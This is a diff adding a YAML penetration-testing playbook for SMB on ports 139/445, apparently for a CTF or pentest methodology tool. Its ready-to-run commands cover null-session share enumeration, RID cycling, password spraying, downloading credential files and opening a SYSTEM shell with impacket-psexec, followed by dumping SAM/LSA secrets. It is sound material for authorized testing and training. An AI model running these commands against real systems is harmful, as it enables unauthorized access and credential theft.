@@ -1,0 +1,104 @@
+id: smb
+name: SMB Enumeration & Assessment (Port 139 / 445)
+category: network
+description: Complete methodology for Server Message Block (SMB / Samba) on ports 139 and 445. Covers anonymous null sessions, share enumeration, RID cycling, password spraying, and PsExec.
+port_triggers:
+  - 139
+  - 445
+service_triggers:
+  - smb
+  - microsoft-ds
+  - netbios-ssn
+tags:
+  - smb
+  - samba
+  - active-directory
+  - network
+steps:
+  - id: smb-version-check
+    title: SMB Version & Signing Fingerprint (NetExec)
+    phase: reconnaissance
+    purpose: Identify the exact SMB protocol version, operating system release, build number, domain name, and whether SMB signing is required or enabled.
+    command: netexec smb {{TARGET}}
+    expected_output:
+      - '[*] SMB {{TARGET}} 445 [HOSTNAME] [*] Windows 10.0 Build 19041 x64 (domain:CORP.LOCAL) (signing:False) (SMBv1:False)'
+    common_mistakes:
+      - Skipping host resolution when targeting Active Directory domain controllers.
+    if_success: Identified OS build and signing status. If `signing:False`, target is vulnerable to NTLM Relay attacks.
+    if_failure: Connection refused. Check firewall rules or port forwarding.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+  - id: smb-null-session
+    title: SMB Null / Anonymous Share Enumeration
+    phase: enumeration
+    purpose: Test if the target permits unauthenticated (null session) connections or allows guest access without supplying valid credentials.
+    command: netexec smb {{TARGET}} -u '' -p '' --shares
+    expected_output:
+      - '[+] \\{{TARGET}}\IPC$ READ'
+      - '[+] \\{{TARGET}}\public READ, WRITE'
+      - '[-] \\{{TARGET}}\C$ (Access Denied)'
+    common_mistakes:
+      - Forgetting to test both null session (empty user/pass) and guest account (user `guest` with no password).
+    if_success: Readable shares found! Download share contents and search for credentials.
+    if_failure: Null session rejected. Proceed to RID user enumeration or password spraying.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+  - id: smb-rid-brute
+    title: User Enumeration via RID Cycling
+    phase: enumeration
+    purpose: Query relative identifiers (RIDs) over SMB/RPC to systematically discover domain or local usernames and SIDs without knowing full accounts in advance.
+    command: netexec smb {{TARGET}} -u '{{USERNAME|guest}}' -p '{{PASSWORD|}}' --rid-brute 10000
+    expected_output:
+      - '[*] 500: DOMAIN\Administrator (SidTypeUser)'
+      - '[*] 1104: DOMAIN\svc-sql (SidTypeUser)'
+      - '[*] 1105: DOMAIN\jdoe (SidTypeUser)'
+    common_mistakes:
+      - Not starting from RID 500 (Administrator) or stopping before reaching custom service accounts (RID 1000-2000).
+    if_success: Usernames discovered! Save to `users.txt` for password spraying and AS-REP Roasting.
+    if_failure: Access denied on RPC endpoint. Check web or LDAP enumeration for user lists.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+  - id: smb-share-spider
+    title: Recursive Share Inspection & Download
+    phase: enumeration
+    purpose: Connect to readable shares and spider file names, looking for configuration files, backup archives, scripts, or credentials.
+    command: smbclient //{{TARGET}}/{{SHARE_NAME|public}} -N -c 'recurse;ls'
+    expected_output:
+      - .\backup\config.ini
+      - .\scripts\deploy.ps1
+      - .\passwords.kdbx
+    common_mistakes:
+      - Using forward slashes in smbclient commands when interacting with nested Windows paths.
+    if_success: Sensitive files located! Download with `smbclient //{{TARGET}}/{{SHARE}} -N -c "get passwords.kdbx"`.
+    if_failure: No files found on public shares. Proceed to authenticated spraying.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+  - id: smb-pass-spray
+    title: SMB Password Spraying
+    phase: exploitation
+    purpose: Test a single password or default credential against all discovered user accounts.
+    command: netexec smb {{TARGET}} -u users.txt -p '{{PASSWORD|Summer2024!}}' --continue-on-success
+    expected_output:
+      - '[+] DOMAIN\jdoe:Summer2024! (Pwn3d!)'
+      - '[-] DOMAIN\admin:Summer2024! (STATUS_LOGON_FAILURE)'
+    common_mistakes:
+      - Spraying passwords too fast and triggering account lockout thresholds.
+    if_success: 'Valid credentials! If marked `(Pwn3d!)`, you have Local Admin rights: proceed to PsExec / WMIExec.'
+    if_failure: Password spray returned 0 hits. Try alternate passwords or seasonal patterns.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+  - id: smb-psexec-shell
+    title: Remote Command Execution via PsExec
+    phase: exploitation
+    purpose: Spawn an interactive NT AUTHORITY\SYSTEM shell over SMB using administrative credentials.
+    command: impacket-psexec '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}'
+    expected_output:
+      - '[*] Requesting shares on {{TARGET}}...'
+      - '[*] Found writable share ADMIN$'
+      - '[*] Opening interactive shell... C:\Windows\system32>'
+    common_mistakes:
+      - Requires Local Admin rights and write access to ADMIN$ or C$ share.
+    if_success: SYSTEM shell acquired! Dump local SAM/LSA secrets and capture root flag.
+    if_failure: ADMIN$ share not writable. Try `impacket-wmiexec` or `evil-winrm` instead.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
